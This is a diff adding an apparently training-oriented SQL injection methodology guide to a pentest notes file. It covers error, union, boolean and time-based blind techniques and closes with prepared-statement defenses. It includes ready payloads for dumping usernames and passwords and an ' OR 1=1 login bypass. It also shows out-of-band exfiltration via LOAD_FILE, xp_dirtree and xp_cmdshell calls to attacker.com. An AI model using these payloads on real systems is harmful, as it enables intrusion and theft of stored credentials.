@@ -562,3 +562,207 @@ When auditing a target running an IIS environment, structure your attack plan us
 [Phase 5: Escalate]    ──> Identify SeImpersonatePrivilege and use Potato exploits for SYSTEM.
 
 ```
+
+
+ **SQL Injection (SQLi) Design & Methodology**
+
+---
+
+# 🗄️ SQL Injection (SQLi) Design & Methodology
+
+## 1. The SQLi Building Blocks
+
+To manipulate a query, you must understand the relational database behaviors that allow payloads to execute cleanly without throwing syntax errors.
+
+### 🔹 SQL Comments
+
+Instructs the database engine to drop trailing query characters. MySQL uses `-- ` (double dash followed by a space) or `#`. Multi-line comments use `/* ... */`.
+
+* **Vulnerability Role:** Truncates leftover logic (like password verifications) that would otherwise break payload syntax.
+
+### 🔹 The `UNION` Operator
+
+Combines the result sets of two or more `SELECT` statements into a single response.
+
+* **The Rule:** Both queries must return the **exact same number of columns**, and their data types must be compatible.
+
+### 🔹 Wildcards (`LIKE`) & Limits (`LIMIT`)
+
+* **`LIKE 'adm%'`:** The `%` wildcard matches any sequence, allowing attackers to guess strings character-by-character in blind attacks.
+* **`LIMIT offset, count`:** Restricts row counts to ensure data dumps fit neatly into the application's visual fields (e.g., `LIMIT 2, 1` skips two rows and returns the third).
+
+### 🔹 `information_schema` (The Database Map)
+
+The built-in metadata catalog for MySQL, MariaDB, and PostgreSQL.
+
+* **`information_schema.tables`:** Maps out tables via `table_name` and `table_schema`.
+* **`information_schema.columns`:** Discovers the precise column labels inside target tables.
+
+---
+
+## 2. In-Band SQL Injection (Direct Visibility)
+
+Data is extracted using the exact same network channel used to inject the payload. The results appear explicitly within the HTML text or application response.
+
+### A. Error-Based SQLi
+
+Exploits verbose database error strings displayed directly on the front-end interface. Triggered via characters like `'` or `"`.
+
+> *Example error:* `"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version..."*
+
+### B. Union-Based SQLi (6-Step Extraction Blueprint)
+
+1. **Find Column Count:** Inject `1 UNION SELECT 1,2,3-- ` (incrementing numbers until the page loads successfully).
+2. **Make Payload Visible:** Set the original parameter ID to an invalid index (like `0` or `-1`) to force only your injected row onto the screen.
+3. **Grab Active DB:** Inject `0 UNION SELECT 1,2,database()-- ` to identify the active database schema name.
+4. **Enumerate Tables:** Inject `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='target_db'-- `
+5. **Enumerate Columns:** Inject `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='target_table'-- `
+6. **Exfiltrate Records:** Inject `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table-- `
+
+---
+
+## 3. Blind SQL Injection (Indirect Visibility)
+
+The web application completely suppresses database errors and query outputs. Data must be deduced through behavioral inferences.
+
+### A. Authentication Bypass
+
+* **Mechanism:** Subverts standard login checks that simply evaluate if a query returns a valid row.
+* **Classic Payload:** Placing `' OR 1=1;-- ` in a username field alters the query:
+```sql
+SELECT * FROM users WHERE username='' OR 1=1;--' AND password='...';
+
+```
+
+
+* **Result:** Because `1=1` is universally true and the password check is commented out, the engine returns the first row in the table (typically the administrator account).
+
+### B. Boolean-Based Blind SQLi
+
+Evaluates binary state signals on the page (e.g., a response shifting from `{"taken":true}` to `{"taken":false}`).
+
+* **Extraction Payload:** Ask targeted Yes/No questions character-by-character:
+```sql
+admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
+
+```
+
+
+* If the application outputs a `True` response state, the first letter is confirmed as `a`.
+
+### C. Time-Based Blind SQLi
+
+Utilized when the application layout remains identical regardless of query validity. Latency is the only telemetry feedback.
+
+* **Extraction Payload:** Force the engine to execute a time delay function like `SLEEP()` if a condition is satisfied:
+```sql
+admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
+
+```
+
+
+* If the server pauses its response for 5 seconds, the condition is true.
+
+>  **Operator Note:** Network latency can cause false positives. Always use distinct sleep windows (5–10 seconds) and double-test responses. On MSSQL, use `WAITFOR DELAY '0:0:5'`.
+
+---
+
+## 4. Out-of-Band (OOB) SQL Injection
+
+Forces the database server to connect out to an external server you control (via DNS or HTTP) and deliver the exfiltrated data within the request structure itself.
+
+### A. DNS Exfiltration (MySQL on Windows)
+
+Uses `LOAD_FILE()` to combine stolen strings as subdomains directed to an attacker's authoritative domain:
+
+```sql
+SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
+
+```
+
+Windows attempts to resolve this UNC share path, generating an outbound DNS request for `webapp_db.attacker.com` that gets caught in the attacker's listener logs.
+
+### B. MSSQL Injection Vectors
+
+* **`xp_dirtree`:** Resolves UNC pathways via DNS lookups (enabled by default):
+```sql
+EXEC master..xp_dirtree '\\data.attacker.com\share';
+
+```
+
+
+* **`xp_cmdshell`:** Executes OS commands to push payloads outward (disabled by default):
+```sql
+EXEC xp_cmdshell 'nslookup data.attacker.com';
+
+```
+
+
+
+*Note: Subdomain labels inside DNS lookups have a hard architectural size limitation of **63 characters**.*
+
+---
+
+## 5. Secure Defensive Architecture
+
+### A. Prepared Statements (Parameterized Queries)
+
+The definitive remediation for SQLi. It compiles the query structure statically with placeholders *before* receiving user input. Input is handled strictly as data parameters, never as executable code.
+
+* **Vulnerable Implementation (String Concatenation):**
+```php
+$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";
+
+```
+
+
+* **Secure Engineering (Parameterized Binding via PHP PDO):**
+```php
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->execute([$_POST['username']]);
+
+```
+
+
+
+### B. Defense-in-Depth Measures
+
+* **Allowlist Input Validation:** Validate properties using precise structural constraints (e.g., verifying numerical fields using `ctype_digit()`). Avoid relying on character filters or blocklists alone, as they are easily bypassed via alternative encodings.
+* **Principle of Least Privilege:** Ensure the web app connects using a tightly restricted database service account. Never connect using highly privileged accounts like `root` or `sa`.
+* **Web Application Firewalls (WAFs):** Deploy as a supplementary signature inspection layer to catch and drop common exploitation payloads, but never treat them as a replacement for secure coding practices.
+
+---
+
+##  SQLi Operational Exploitation Cheat Sheet
+
+```
+                  ┌────────────────────────────────────────┐
+                  │      SQL Injection Payload Flow        │
+                  └────────────────────────────────────────┘
+                                       │
+         ┌─────────────────────────────┴─────────────────────────────┐
+         ▼                                                           ▼
+  [In-Band Methods]                                           [Blind Methods]
+         │                                                           │
+         ├─► Level 1: Union-Based                                    ├─► Level 2: Auth Bypass
+         │   Extract via HTML output columns                         │   Force True rows via OR 1=1
+         │                                                           │
+         └─► Error-Based                                             ├─► Level 3: Boolean-Based
+             Extract via database error logs                         │   Read true/false binary signals
+                                                                     │
+                                                                     └─► Level 4: Time-Based
+                                                                         Deduce strings via SLEEP()
+
+```
+
+### Core Cross-Engine Reference
+
+| Database Engine | Single-Line Comment Syntax | Time-Delay Functions | Metadata System Directory |
+| --- | --- | --- | --- |
+| **MySQL / MariaDB** | `-- ` (with space) <br>
+
+<br> `#` | `SLEEP(5)` | `information_schema` |
+| **PostgreSQL** | `--` | `pg_sleep(5)` | `information_schema` |
+| **Microsoft SQL Server** | `--` | `WAITFOR DELAY '0:0:5'` | `information_schema` or `sys.tables` |
+| **SQLite** | `--` | `randomblob(100000000)` | `sqlite_master` |
+| **Oracle** | `--` | `dbms_pipe.receive_message` | `all_tables` |
